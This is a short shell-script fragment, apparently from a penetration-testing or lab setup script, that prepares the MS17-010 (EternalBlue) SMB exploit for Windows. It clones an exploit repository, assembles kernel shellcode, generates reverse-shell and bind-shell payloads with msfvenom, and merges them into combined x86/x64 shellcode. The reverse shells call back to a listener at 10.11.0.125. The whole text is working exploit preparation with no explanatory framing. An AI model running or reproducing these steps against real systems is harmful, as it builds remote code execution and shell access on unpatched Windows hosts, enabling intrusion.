# MS17-010 - START
mkdir -p exploits_windows/smb/ms17-010
cd exploits_windows/smb/ms17-010

  git clone --depth=1 --recursive https://github.com/helviojunior/MS17-010.git .

  nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o ./shellcode/sc_x64_kernel.bin
  msfvenom -p windows/x64/shell_reverse_tcp LPORT=62000 LHOST=10.11.0.125 EXITFUNC=thread --platform windows -a x64 --format raw -o ./shellcode/sc_x64_payload_rev.bin
  msfvenom -p windows/x64/shell_bind_tcp LPORT=62000 --platform windows -a x64 --format raw -o ./shellcode/sc_x64_payload.bin
  cat ./shellcode/sc_x64_kernel.bin ./shellcode/sc_x64_payload.bin > ./shellcode/sc_x64.bin
  cat ./shellcode/sc_x64_kernel.bin ./shellcode/sc_x64_payload_rev.bin > ./shellcode/sc_x64_rev.bin

  nasm -f bin shellcode/eternalblue_kshellcode_x86.asm -o ./shellcode/sc_x86_kernel.bin
  msfvenom -p windows/shell_reverse_tcp LPORT=62000 LHOST=10.11.0.125 EXITFUNC=thread --platform windows -a x86 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x86_payload_rev.bin
  msfvenom -p windows/shell_bind_tcp LPORT=62000 --platform windows -a x86 --format raw -o ./shellcode/sc_x86_payload.bin
  cat ./shellcode/sc_x86_kernel.bin ./shellcode/sc_x86_payload.bin > ./shellcode/sc_x86.bin
  cat ./shellcode/sc_x86_kernel.bin ./shellcode/sc_x86_payload_rev.bin > ./shellcode/sc_x86_rev.bin

  python ./shellcode/eternalblue_sc_merge.py ./shellcode/sc_x86.bin ./shellcode/sc_x64.bin ./shellcode/sc_all.bin
  python ./shellcode/eternalblue_sc_merge.py ./shellcode/sc_x86_rev.bin ./shellcode/sc_x64_rev.bin ./shellcode/sc_all_rev.bin

cd -
# MS17-010 - END
